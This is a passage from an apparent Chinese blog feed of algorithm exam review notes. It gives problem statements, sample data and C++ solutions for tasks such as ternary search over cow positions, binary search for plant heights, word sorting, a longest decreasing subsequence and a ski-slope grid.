class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="问题-J-奶牛的聚会"><a href="#问题-J-奶牛的聚会" class="headerlink" title="问题 J: 奶牛的聚会"></a>问题 J: 奶牛的聚会</h2><h3 id="题目描述-5"><a href="#题目描述-5" class="headerlink" title="题目描述"></a>题目描述</h3><p>农历新年马上就要到了，奶牛们计划举办一次聚会庆祝新年的到来。但是，奶牛们并不喜欢走太远的路，这会给他们的聚会带来消极情绪，当一头奶牛的消极指数为Wi，他参加聚会所需行走的距离为si，那么他就会给聚会带来Si3*Wi的消极情绪。所有奶牛所在位置都在一条直线上，已知所有奶牛的坐标和消极指数，求如何确定聚会地点，使得所有奶牛给聚会带来的消极情绪之和最小，输出消极情绪之和的最小值。</p><h3 id="输入-5"><a href="#输入-5" class="headerlink" title="输入"></a>输入</h3><p>第一行包含一个整数 Ca(Ca&lt;=20) ，表示有 Ca 组测试数据。</p><p>对于每组测试数据：第一行包含一个整数n(1&lt;=n&lt;=50000) ，表示奶牛的数量。接下来 n 行每行包含两个浮点数Si和wi (-106&lt;=Si&lt;=106, 0&lt;Wi&lt;15)。</p><h3 id="输出-5"><a href="#输出-5" class="headerlink" title="输出"></a>输出</h3><p>对于每组测试数据，输出 “Case #c: ans” ，其中c表示测试数据编号，ans表示消极情绪之和的最小值，结果四舍五入为一个整数。</p><h3 id="样例输入-5"><a href="#样例输入-5" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">5</span><br><span class="line">0.9 2</span><br><span class="line">1.4 4</span><br><span class="line">3.1 1</span><br><span class="line">6.2 1</span><br><span class="line">8.3 2</span><br></pre></td></tr></table></figure><h3 id="样例输出-5"><a href="#样例输出-5" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Case #1: 300</span><br></pre></td></tr></table></figure><h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><p>三分查找法确定消极情绪之和最小的位置，结合注释应该不难理解。</p><h3 id="代码-5"><a href="#代码-5" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">50010</span>;</span><br><span class="line"><span class="keyword">double</span> Si[maxn], wi[maxn];</span><br><span class="line"><span class="keyword">int</span> n, Ca;</span><br><span class="line"><span class="comment">//计算聚会位置在pos时的消极情绪之和</span></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">ans</span><span class="params">(<span class="keyword">double</span> pos)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">double</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//计算每个奶牛距离聚会位置的距离(非负)</span></span><br><span class="line">        <span class="keyword">double</span> dist = Si[i] - pos;</span><br><span class="line">        <span class="keyword">if</span> (dist &lt; <span class="number">0</span>)</span><br><span class="line">            dist = -dist;</span><br><span class="line">        sum += <span class="built_in">pow</span>(dist, <span class="number">3</span>) * wi[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; Ca;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= Ca; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; n;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; n; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">cin</span> &gt;&gt; Si[j] &gt;&gt; wi[j];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//找到坐标位置最小的奶牛</span></span><br><span class="line">        <span class="keyword">double</span> low = Si[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">0</span>; k &lt; n; k++)</span><br><span class="line">            <span class="keyword">if</span> (Si[k] &lt; low)</span><br><span class="line">                low = Si[k];</span><br><span class="line">        <span class="comment">//找到坐标位置最小的奶牛</span></span><br><span class="line">        <span class="keyword">double</span> high = Si[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> l = <span class="number">0</span>; l &lt; n; l++)</span><br><span class="line">            <span class="keyword">if</span> (Si[l] &gt; high)</span><br><span class="line">                high = Si[l];</span><br><span class="line">        <span class="comment">//三分查找法确定最终位置</span></span><br><span class="line">        <span class="keyword">while</span> (high - low &gt; <span class="number">1e-7</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">double</span> m1 = (high + low) / <span class="number">2.0</span>;</span><br><span class="line">            <span class="keyword">double</span> m2 = (m1 + high) / <span class="number">2.0</span>;</span><br><span class="line">            <span class="keyword">if</span> (ans(m1) &gt; ans(m2))</span><br><span class="line">                low = m1;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                high = m2;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"Case #"</span> &lt;&lt; i &lt;&lt; <span class="string">": "</span> &lt;&lt; ll(ans(low) + <span class="number">0.5</span>) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="问题-E-光合作用"><a href="#问题-E-光合作用" class="headerlink" title="问题 E: 光合作用"></a>问题 E: 光合作用</h2><h3 id="题目描述-6"><a href="#题目描述-6" class="headerlink" title="题目描述"></a>题目描述</h3><p>蒜头是个爱学习的孩子，他总喜欢在生活中做一些小实验，这次蒜头想研究一下光合作用。蒜头的实验材料有如下几样：神奇的种子，普通的纸箱和一些光源。一开始，蒜头将种子均匀的种在了箱子底部，你可以将其看成 X 轴，种子的位置为 X 轴上的点。然后蒜头用纸板将箱子盖住，并在纸板上安装了一些光源（具体见图，顶上的为光源，光源两边与顶部的夹角都为45度，黄色部分为光照，绿色的为植物。）。神奇的种子会在有光的情况下一直向上生长直到没光为止。现在蒜头想知道当实验结束时每颗种子的高度是多少？</p><h3 id="输入-6"><a href="#输入-6" class="headerlink" title="输入"></a>输入</h3><p>第一行输入一个整数 T，表示测试数据的组数。</p><p>每组数据的第一行是三个整数 n,m,h(1&lt;=n,m&lt;=1e5,0&lt;=m&lt;=1e5,1&lt;=h&lt;=1e4),n表示种子数(编号为1,2…n)，m表示光源数,h 表示箱子的高度。</p><p>接下来m行，每行一个整数Xi表示第i个光源在顶部的位置。</p><h3 id="输出-6"><a href="#输出-6" class="headerlink" title="输出"></a>输出</h3><p>对于每组测试数据，请输出n行，每行一个数表示第i颗种子的最终高度。</p><h3 id="样例输入-6"><a href="#样例输入-6" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">2</span><br><span class="line">7 1 2</span><br><span class="line">4</span><br><span class="line">4 4 1</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td></tr></table></figure><h3 id="样例输出-6"><a href="#样例输出-6" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0</span><br><span class="line">0</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">1</span><br><span class="line">0</span><br><span class="line">0</span><br><span class="line">1</span><br><span class="line">1</span><br><span class="line">1</span><br><span class="line">1</span><br></pre></td></tr></table></figure><h3 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h3><p>二分法</p><h3 id="代码-6"><a href="#代码-6" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="comment">/*********************************************************************************************</span></span><br><span class="line"><span class="comment">lower_bound( begin,end,num)：从数组的begin位置到end-1位置二分查找第一个大于或等于num的数字，找到返回该数字的地址，不存在则返回end。通过返回的地址减去起始地址begin,得到找到数字在数组中的下标。</span></span><br><span class="line"><span class="comment">upper_bound( begin,end,num)：从数组的begin位置到end-1位置二分查找第一个大于num的数字，找到返回该数字的地址，不存在则返回end。通过返回的地址减去起始地址begin,得到找到数字在数组中的下标。</span></span><br><span class="line"><span class="comment">********************************************************************************************/</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">1e5</span> + <span class="number">5</span>;</span><br><span class="line"><span class="keyword">int</span> x[maxn];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> T;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; T;</span><br><span class="line">    <span class="keyword">while</span> (T--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> n, m, h;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; n &gt;&gt; m &gt;&gt; h;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= m; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">cin</span> &gt;&gt; x[i];</span><br><span class="line">        &#125;</span><br><span class="line">        sort(x + <span class="number">1</span>, x + m + <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">int</span> cnt = lower_bound(x + <span class="number">1</span>, x + m + <span class="number">1</span>, i) - x;</span><br><span class="line">            <span class="keyword">if</span> (cnt == <span class="number">1</span> &amp;&amp; m != <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                ans = <span class="built_in">max</span>(ans, h - x[cnt] + i);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (cnt == m + <span class="number">1</span> &amp;&amp; m != <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                ans = <span class="built_in">max</span>(ans, h - i + x[cnt - <span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (m != <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                ans = <span class="built_in">max</span>(<span class="number">0</span>, <span class="built_in">max</span>(h - i + x[cnt - <span class="number">1</span>], h - x[cnt] + i));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; ans &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>算法考试复习2</title>
      <link href="/2020/10/28/algorithm2/"/>
      <url>/2020/10/28/algorithm2/</url>
      
        <content type="html"><![CDATA[<blockquote><p>借鉴了学长们的研究成果</p></blockquote><a id="more"></a><h2 id="0x01-单词排序"><a href="#0x01-单词排序" class="headerlink" title="0x01 单词排序"></a>0x01 单词排序</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>小红学会了很多英文单词，妈妈为了帮小红加强记忆，拿出纸、笔，把 N 个单词写在纸上的一行里，小红看了几秒钟后，将这张纸扣在桌子上。妈妈问小红：“你能否将这 N 个单词按照字典排列的顺序，从小到大写出来？”小红按照妈妈的要求写出了答案。现在请你编写程序帮助妈妈检查小红的答案是否正确。注意：所有单词都由小写字母组成，单词两两之间用一个空格分隔。</p><h3 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h3><p>输入包含两行。</p><p>第一行仅包括一个正整数N(0&lt;N≤26)。</p><p>第二行包含N个单词，表示妈妈写出的单词，两两之间用一个空格分隔。</p><p>单个单词长度不超过1010。</p><h3 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h3><p>输出仅有一行。针对妈妈写出的单词，按照字典排列的顺序从小到大排列成一行的结果，每个单词后带一个空格。</p><h3 id="样例输入"><a href="#样例输入" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">4</span><br><span class="line">city boy tree student</span><br></pre></td></tr></table></figure><h3 id="样例输出"><a href="#样例输出" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">boy city student tree</span><br></pre></td></tr></table></figure><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</span><br><span class="line"><span class="built_in">string</span> res[<span class="number">30</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n;++i)&#123;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; res[i];</span><br><span class="line">    &#125;</span><br><span class="line">    sort(res, res + n);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n;++i)&#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; res[i] &lt;&lt; <span class="string">' '</span>;</span><br><span class="line">    &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x02-求数组的最长递减序列"><a href="#0x02-求数组的最长递减序列" class="headerlink" title="0x02 求数组的最长递减序列"></a>0x02 求数组的最长递减序列</h2><h3 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h3><p>给定一个整数序列，输出它的最长递减（注意不是“不递增”）子序列。</p><h3 id="输入-1"><a href="#输入-1" class="headerlink" title="输入"></a>输入</h3><p>输入包括两行，第一行包括一个正整数N（N&lt;=1000），表示输入的整数序列的长度。第二行包括用空格分隔开的N个整数，整数范围区间为[-30000,30000]。</p><h3 id="输出-1"><a href="#输出-1" class="headerlink" title="输出"></a>输出</h3><p>输出最长递减子序列，数字之间有一个空格。</p><h3 id="样例输入-1"><a href="#样例输入-1" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">8</span><br><span class="line">9 4 3 2 5 4 3 2</span><br></pre></td></tr></table></figure><h3 id="样例输出-1"><a href="#样例输出-1" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">9 5 4 3 2</span><br></pre></td></tr></table></figure><h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">参考：https:&#x2F;&#x2F;leetcode-cn.com&#x2F;problems&#x2F;longest-increasing-subsequence&#x2F;solution&#x2F;zui-chang-shang-sheng-zi-xu-lie-dong-tai-gui-hua-2&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;leetcode-cn.com&#x2F;problems&#x2F;number-of-longest-increasing-subsequence&#x2F;solution&#x2F;dong-tai-gui-hua-jie-zui-chang-zi-xu-lie-zi-chua-4&#x2F;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="keyword">int</span> dp[<span class="number">1005</span>]=&#123;<span class="number">1</span>&#125;, nums[<span class="number">1005</span>], res[<span class="number">1005</span>]=&#123;<span class="number">-1</span>&#125;; <span class="comment">//oj好像没办法这样初始化</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; n;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n;++i)&#123;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; nums[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n;++i)&#123;</span><br><span class="line">        dp[i] = <span class="number">1</span>;</span><br><span class="line">        res[i] = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; i;++j)&#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[i]&lt;nums[j]&amp;&amp;dp[j]+<span class="number">1</span>&gt;dp[i]) <span class="comment">//严格递减</span></span><br><span class="line">            &#123;</span><br><span class="line">                dp[i] = dp[j] + <span class="number">1</span>;</span><br><span class="line">                res[i] = j;<span class="comment">//方便找到字串</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> maxn = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> num = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(dp[i]&gt;maxn)</span><br><span class="line">        &#123;</span><br><span class="line">            maxn=dp[i];</span><br><span class="line">            num=i; <span class="comment">//找到最优解</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">stack</span>&lt;<span class="keyword">int</span>&gt; a;</span><br><span class="line">    a.push(nums[num]);</span><br><span class="line">    <span class="keyword">while</span>(res[num]!=<span class="number">-1</span>)&#123;</span><br><span class="line">        a.push(nums[res[num]]);</span><br><span class="line">        num = res[num];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(!a.empty())&#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; a.top() &lt;&lt; <span class="string">' '</span>;</span><br><span class="line">        a.pop();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x03-矩形滑雪场"><a href="#0x03-矩形滑雪场" class="headerlink" title="0x03 矩形滑雪场"></a>0x03 矩形滑雪场</h2><h3 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h3><p>zcb喜欢滑雪。他来到了一个滑雪场，这个滑雪场是一个矩形，为了简便，我们用r行c列的矩阵来表示每块地形。为了得到更快的速度，滑行的路线必须向下倾斜。 例如样例中的那个矩形，可以从某个点滑向上下左右四个相邻的点之一。例如24-17-16-1，其实25-24-23…3-2-1更长，事实上这是最长的一条。</p><h3 id="输入-2"><a href="#输入-2" class="headerlink" title="输入"></a>输入</h3><p>第1行:两个数字r，c(1 ≤ r, c ≤ 100)，表示矩阵的行列。第2..r+1行:每行c个数，表示这个矩阵。</p><h3 id="输出-2"><a href="#输出-2" class="headerlink" title="输出"></a>输出</h3><p>仅一行:输出1个整数，表示可以滑行的最大长度。</p><h3 id="样例输入-2"><a href="#样例输入-2" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">5 5</span><br><span class="line">1 2 3 4 5</span><br><span class="line">16 17 18 19 6</span><br><span class="line">15 24 25 20 7</span><br><span class="line">14 23 22 21 8</span><br><span class="line">13 12 11 10 9</span><br></pre></td></tr></table></figure><h3 id="样例输出-2"><a href="#样例输出-2" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">25</span><br></pre></td></tr></table></figure><h3 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span 